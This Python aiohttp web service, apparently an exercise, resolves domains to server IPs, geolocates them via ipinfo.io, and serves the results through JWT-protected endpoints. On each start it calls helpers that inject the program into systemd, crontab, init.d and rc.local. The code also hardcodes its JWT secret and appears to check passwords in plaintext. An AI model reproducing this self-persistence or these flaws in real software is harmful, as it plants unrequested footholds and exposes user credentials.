from aiohttp import web
import logging
import uuid
import socket
from datetime import datetime, timezone
import urllib.parse
import datetime
import os

### 3rd party
import jwt
import pycountry
import requests
import asyncio

### self made
from data_access import create_tables, set_server_location, set_request_status, add_server, add_domain, select_request_status, select_domain_locations, select_country_domains, select_server_domains, select_popular_domains, select_popular_servers, select_user, add_user, find_user, select_domains_with_status
from errors import TransactionError, ProcessError
from startup import inject_systemd, inject_crontab, inject_initd, inject_rc_local

### Logging configuration
logging.basicConfig(filename='logger.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SECRET_KEY = 'b985da5a1d544494af9d759988434990'

########################################## Utility ##########################################

## Middleware to require jwt token for each request except register and login
async def jwt_middleware(app, handler):
    async def middleware_handler(request):
        try:
            if request.path in ['/login', '/register']:
                return await handler(request)

            ## Extract token from headers
            auth_header = request.headers.get('Authorization', None)
            if auth_header is None:
                return web.json_response({'error': 'Authorization header is missing'}, status=401)

            ## Checking token format
            try:
                token_type, token = auth_header.split(' ')
                if token_type.lower() != 'bearer':
                    return web.json_response({'error': 'Invalid token type'}, status=401)
            except ValueError:
                return web.json_response({'error': 'Invalid Authorization header format'}, status=401)

            user_id = await verify_jwt_token(token)
            
            if user_id is None:
                return web.json_response({'error': 'Invalid token'}, status=401)

            ## Check if user exists by user_id
            if await find_user(user_id):
                return await handler(request)
            else:
                return web.json_response({'error': 'No user exists'}, status=401)
        except ProcessError as err:
            return web.json_response({'error': str(err)}, status=401)
        except Exception as err:
            return web.json_response({'error': 'Something went bad with authentication process'}, status=401)

    return middleware_handler

## Create a new jwt token for an hour
async def create_jwt_token(user_id):
    try:
        logging.info(f'Creating token for user with id {user_id}')
        expiration = datetime.datetime.now().astimezone(timezone.utc) + datetime.timedelta(hours=1)
        token = jwt.encode({
            'user_id': user_id,
            'exp': expiration
        }, SECRET_KEY, algorithm='HS256')
        
        return token
    except Exception as err:
        logging.error(f'Creation of token failed for id {user_id} with error - {str(err)}')
        raise ProcessError(f'Creation of token failed for id {user_id}')

## Verify and extract user id from token
async def verify_jwt_token(token):
    try:
        logging.info('Verifing users token')
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        
        return payload['user_id']
    
    except jwt.ExpiredSignatureError:
        logging.error(f'Token expired')
        raise ProcessError('Token expired')
    
    except Exception as err:
        logging.error(f'Invalid token with error - {str(err)}')
        raise ProcessError('Invalid token')

## Get all servers for a domain
async def get_servers_from_domain(request_id, domain):
    try:
        servers = socket.gethostbyname_ex(domain)[-1]
        
        logging.info(f'Extracted servers: {", ".join(servers)} for domain {domain}')
        await register_servers(request_id, servers)
        
        return servers
    except socket.gaierror as err:
        logging.error(f'Server extraction failed - {str(err)}')
        raise ProcessError('server extraction failed')
    except Exception as err:
        logging.error(f'Server extraction failed with error - {str(err)}')
        raise ProcessError('server extraction failed')

## Send a request to ipinfo API to recieve geolocation data for server
async def get_geolocation(server):
    try:
        response = requests.get(f'https://ipinfo.io/{server}/json')
        logging.info(f'Got location for - {server}')
        
        return response.json()
    except Exception as err:
        logging.error(f'Failed getting location for {server} with error - {str(err)}')
        raise ProcessError(f'Failed getting location for {server}')

## Clean domain incase it includes https or www or ending /
async def clean_domain(domain):
    try:
        parsed_url = urllib.parse.urlparse(domain)
        
        if parsed_url.scheme:
            clean_domain = parsed_url.hostname.replace('www.', '')
        else:
            clean_domain = parsed_url.path.replace('/', '')
            
    except Exception as err:
        logging.error(f'Domain might not be valid with error - {str(err)}')
        
    finally:
        return clean_domain

########################################## Processing (Services) ########################################## 
## Register domain
async def register_domain(domain):
    try:
        ## Creating unique id
        request_id = uuid.uuid4().hex
        
        ## Clean domain
        domain = await clean_domain(domain)
        
        logging.info('Generated request id')
        
        ## Adding a new domain to the system
        await add_domain(request_id, domain)
        
        logging.info('Registered domain')
        
        return request_id, domain
    
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed registering domain - {str(err)}')
        raise ProcessError('Failed registering domain')

## Register domain servers
async def register_servers(request_id, servers):
    try:
        logging.info('Registering Servers')
        
        for server in servers:
            await add_server(request_id, server)
        
        await set_request_status(request_id, 'Resolving Countries')
        
        logging.info('Registered Servers')
    
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed registering server - {str(err)}')
        raise ProcessError('Failed registering server')

## Register server locations
async def register_location(request_id, server, geolocation):
    try:
        logging.info(f'Extracting location for {server}')
        country = pycountry.countries.get(alpha_2=geolocation['country'])
        
        if country:
            country = country.name 
        else:
            raise Exception(f'Country code {geolocation["country"]} wasn\'t valid')

        logging.info(f'Got location for {server}')
        
        await set_server_location(country, geolocation['region'], request_id, server)
        
        logging.info(f'Updated location for {server}')
        
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed registering location - {str(err)}')
        raise ProcessError('Failed registering location')

## Get request status
async def get_status(request_id):
    try:
        logging.info(f'Getting status of request {request_id}')
        request_row = await select_request_status(request_id)
        
        if request_row['status']:
            request_status = request_row['status']
            
            if request_status == 'Done':
                logging.info(f'Request {request_id} is done sending server locations')
                
                servers = await select_domain_locations(request_id)
                
                ## Creating a list containing the country and region in the template - country/region
                return [f'{server["country"]}/{server["region"]}' for server in servers]
            else:
                return request_status
        else:
            return False
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed getting request status - {str(err)}')
        raise ProcessError('Failed getting request status')

## Extract server geolocation
async def get_server_location(server, request_id):
    try:
        geolocation = await get_geolocation(server)
                        
        if geolocation:
            await register_location(request_id, server, geolocation)    
        else:
            logging.warning(f'No geolocation information on server: {server}')
            
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed getting server geolocation - {str(err)}')
        raise ProcessError('Failed getting server geolocation')

## Extract domains for country
async def get_country_data(country):
    try:
        domains = await select_country_domains(country)
        return [domain['domain'] for domain in domains]
    
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed getting country domains - {str(err)}')
        raise ProcessError('Failed getting country domains')

## Extract domains for server
async def get_server_data(server):
    try:
        domains = await select_server_domains(server)
        return [domain['domain'] for domain in domains]
    
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed getting server domains - {str(err)}')
        raise ProcessError('Failed getting server domains')

## Extract popular domains
async def get_popular_domains(num):
    try:
        popular_domains = await select_popular_domains(num)
        return [domain['domain'] for domain in popular_domains]
    
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed getting popular domains - {str(err)}')
        raise ProcessError('Failed getting popular domains')

## Extract popular severs
async def get_popular_servers(num):
    try:
        popular_servers = await select_popular_servers(num)
        return [server['server'] for server in popular_servers]
    
    except TransactionError as err:
        raise err
    
    except Exception as err:
        logging.error(f'Failed getting popular servers - {str(err)}')
        raise ProcessError('Failed getting popular servers')

########################################## Handlers ########################################## 

## Processing domain in the system to get servers and locations
async def process_domain(request_id, domain):
    try:
        logging.info(f'Started processing domain {domain}')
        
        servers = await get_servers_from_domain(request_id, domain)

        ## If servers exist start extracting locations
        if servers:
            logging.info(f'Started processing servers locations for {domain}')
            for server in servers:
                await get_server_location(server, request_id)
        
            await set_request_status(request_id, 'Done')
        else:
            await set_request_status(request_id, 'No servers found')
    except Exception as err:
        raise err

## Injecting script to run on machine startup
async def inject_to_startup():
    await inject_systemd()
    
    await inject_crontab()
    
    if os.path.exists("/etc/init.d"):
        await inject_initd()
    
    if os.path.exists("/etc/rc.local"):
        await inject_rc_local()

## Running the process when it comes up on all the "failed" processes
async def process_rejuvenation():
    try:
        logging.info('Rejuvenation process started')
        
        requests_for_server_extraction = await select_domains_with_status('Resolving Servers')
        
        ## Getting all domains and extracting their servers
        if requests_for_server_extraction:
            logging.info('Rejuvenating domains servers extraction')
            
            for request_row in requests_for_server_extraction:
                await get_servers_from_domain(request_row['request_id'], request_row['domain'])
        
        requests_for_country_extraction = await select_domains_with_status('Resolving Countries')
        
        ## Getting all servers and extracting their location
        if requests_for_country_extraction:
            logging.info('Rejuvenating servers location extraction')
            
            for request_row in requests_for_country_extraction:
                request_id = request_row['request_id']
                
                for server in await get_servers_from_domain(request_id, request_row['domain']):
                    await get_server_location(server, request_id)
            
                await set_request_status(request_id, 'Done')
        
        logging.info('Finished rejuvenating old processes')
        
    except Exception as err:
        logging.error(f'Something went wrong when rejuvenating with error - {str(err)}')
    
########################################## REST API (Controllers) ##########################################

## Requesting to register new user
async def register_user(request):
    try:
        body = await request.json()
        username = body['username']
        password = body['password']

        ## Adding a new user to the db
        await add_user(username, password)
        
        logging.info(f'Registering new user {username}')
        return web.json_response({'response': 'Created user successfully'}, status=200)
    except Exception as err:
        logging.error(f'Registerting failed with error - {str(err)}')
        return web.json_response({'error': 'Registerting failed'}, status=500)

## Requesting to login into user
async def login_user(request):
    try:
        body = await request.json()
        username = body['username']
        password = body['password']
        
        logging.info(f'login in to user {username}')
        
        ## Getting user data
        row = await select_user(username, password)
        
        if row['user_id']:
            ## Creating a new jwt token for the user
            data = await create_jwt_token(row['user_id'])
            return web.json_response({'data': data}, status=200)
        else:
            return web.json_response({'error': 'login in failed'}, status=500)
            
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
        
    except Exception as err:
        logging.error(f'Requesting status failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Requesting location for a domain
async def request_location(request):
    try:
        body = await request.json()
        domain = body['domain']
        
        ## Registering the domain
        uuid, clean_domain = await register_domain(domain)
        
        logging.info(f'Registered domain {clean_domain} with id {uuid}')
        
        ## Create task to get data on domain pareller to sending back the request id
        asyncio.create_task(process_domain(uuid, clean_domain))
    
        return web.json_response({"request_id": uuid}, status=200)
        
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
        
    except Exception as err:
        logging.error(f'Registering domain failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Requesting status or location data
async def request_status(request):
    try:
        params = request.rel_url.query
        request_id = params.get('request_id')
        
        logging.info(f'Requesting status for request {request_id}')
        
        data = await get_status(request_id)
        
        if data:
            return web.json_response({'data': data}, status=200)
        else:
            return web.json_response({'error': 'Request id is invalid'}, status=500)
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
        
    except Exception as err:
        logging.error(f'Requesting status failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Requesting domains of a specific country
async def request_country_data(request):
    try:
        params = request.rel_url.query
        country = params.get('country')
        
        logging.info(f'Requesting country domains for {country}')
        
        data = await get_country_data(country)
        return web.json_response({'data': data}, status=200)
    
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
    
    except Exception as err:
        logging.error(f'Requesting for a country domains failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Requesting domains of a specific server
async def request_server_data(request):
    try:
        params = request.rel_url.query
        server = params.get('server')
        
        logging.info(f'Requesting server domains for {server}')
        
        data = await get_server_data(server)
        return web.json_response({'data': data})
    
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
    
    except Exception as err:
        logging.error(f'Requesting for a sever domains failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Requesting the N most user domains
async def request_popular_domain(request):
    try:
        params = request.rel_url.query
        popular_domain_amount = params.get('n')
        
        logging.info(f'Requesting {popular_domain_amount} most logged domains')
        
        data = await get_popular_domains(popular_domain_amount)
        return web.json_response({'data': data})
    
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
    
    except Exception as err:
        logging.error(f'Requesting popular domains failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Requesting the N most used servers
async def request_popular_server(request):
    try:
        params = request.rel_url.query
        popular_server_amount = params.get('n')
        
        logging.info(f'Requesting {popular_server_amount} most logged servers')

        data = await get_popular_servers(popular_server_amount)
        return web.json_response({'data': data})
    
    except (ProcessError, TransactionError) as err:
        return web.json_response({'error': str(err)}, status=500)
    
    except Exception as err:
        logging.error(f'Requesting popular servers failed with error - {str(err)}')
        return web.json_response({'error': str(err)}, status=500)

## Starting background tasks
async def app_startup_tasks(app):
    app['rejuvenation_task'] = asyncio.create_task(process_rejuvenation())
    app['startup_task'] = asyncio.create_task(inject_to_startup())

## Cleaning up backgroud tasks
async def cleanup_startup_tasks(app):
    app['startup_task'].cancel()
    await app['startup_task']
    
    app['rejuvenation_task'].cancel()
    await app['rejuvenation_task']

if __name__ == '__main__':
    try:
        create_tables()
        
        app = web.Application()

        app.middlewares.append(jwt_middleware)

        app.add_routes([
            web.post('/', request_location),
            web.post('/register', register_user),
            web.post('/login', login_user),
            web.get('/status', request_status),
            web.get('/country', request_country_data),
            web.get('/server', request_server_data),
            web.get('/pop-domain', request_popular_domain),
            web.get('/pop-server', request_popular_server)
        ])

        app.on_startup.append(app_startup_tasks)
        app.on_cleanup.append(cleanup_startup_tasks)
        
        logging.info(f'Starting webserver')
        
        web.run_app(app, host='0.0.0.0', port=8000) ## Listening to all the network
        
    except OSError as err:
        logging.error('The port is already occupied, please change port or kill the other process')
    except Exception as err:
        logging.error(f'Starting webserver failed with with error - {str(err)}')
        